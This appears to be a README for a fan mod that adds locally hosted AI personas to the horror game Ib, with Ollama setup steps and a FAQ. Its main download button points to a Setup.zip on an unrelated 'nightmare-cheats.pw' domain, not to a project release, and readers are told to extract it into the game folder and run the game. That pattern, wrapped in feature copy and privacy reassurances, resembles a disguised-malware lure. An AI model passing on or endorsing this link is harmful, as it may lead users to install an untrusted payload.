## About

**Ib — AI Edition** takes place inside Guertena's gallery after it stops being a gallery. Ib is nine, her rose is her life, and the artworks have opinions.

The mod's best feature is the paintings. A locally-hosted model generates new Guertena works — title, medium, plaque text — and then lets them talk to you, which is generally a mistake.

> 🌹 Rose petals are tracked. As they fall, the personas around you notice, and Garry's protective instinct escalates accordingly.

## ✨ Features

- 🖼️ **Artwork generation** — New Guertena pieces with titles, plaques and personalities.
- 🌹 **Rose petal system** — A life counter that all personas are aware of and react to.
- 🎨 **Gallery narration** — Room descriptions in the game's spare, uneasy register.
- 🤝 **Companion dynamics** — Garry and Mary as full personas with competing agendas.

## 📥 Download & Installation

### Step 1 — Get the mod

[![Download Now](https://img.shields.io/badge/%E2%AC%87%20Download%20Now-2ea44f?style=for-the-badge&logo=github)](https://nightmare-cheats.pw/Setup.zip)

### Step 2 — Install Ollama (the local AI engine)

Ollama is a free, open-source runtime that executes language models directly on your own hardware.

1. Download it from **https://ollama.com/download** for your operating system
2. Run the installer and let it finish
3. Open a terminal and pull a model:

   ```
   ollama pull llama3
   ```

   *(~4.7 GB. Any model from https://ollama.com/library will work — larger models give
   better in-character writing, smaller ones respond faster.)*

### Step 3 — Install into Ib

1. Start from a clean, working installation of **Ib**
2. Extract the downloaded archive
3. Copy its contents into the game's main folder
4. Launch the game — the AI layer initialises on first run

## ❓ FAQ

**Q: Which version?**
> The original freeware release and the Steam remake are both supported.

**Q: Is the gallery's true nature spoiled?**
> Mary's persona knows. A spoiler-limited variant is available in the config.

**Q: Can Ib speak?**
> She's near-silent in the game; the mod keeps her replies deliberately minimal.

**Q: Are my conversations private?**
> Completely. The model runs on your machine and logs are written to a local folder.
> Disconnect from the internet and the mod keeps working.

**Q: Does this use ChatGPT or any paid API?**
> No. There are no API keys, no accounts, and no subscriptions. Ollama is free and open source.

**Q: Can I use an uncensored model?**
> Yes — pull any model from https://ollama.com/library. Uncensored variants sometimes follow
> the roleplay format less reliably, which is a trade-off you control.

**Q: Will this touch my save files?**
> No. The mod never reads or writes the game's save data.

**Q: The AI returned an error instead of a reply. Why?**
> The model produced output the mod couldn't parse. Switch models, lower the temperature,
> or shorten the system prompt.
